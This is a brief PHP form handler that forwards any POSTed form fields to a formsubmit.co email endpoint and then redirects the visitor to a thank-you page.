<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $url = 'https://formsubmit.co/akmalwafi182@gmail.com';

    $data = $_POST;

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Optional: you can log or inspect $result if needed

    // Redirect to success page
    header("Location: th2.html");
    exit();
}
?>
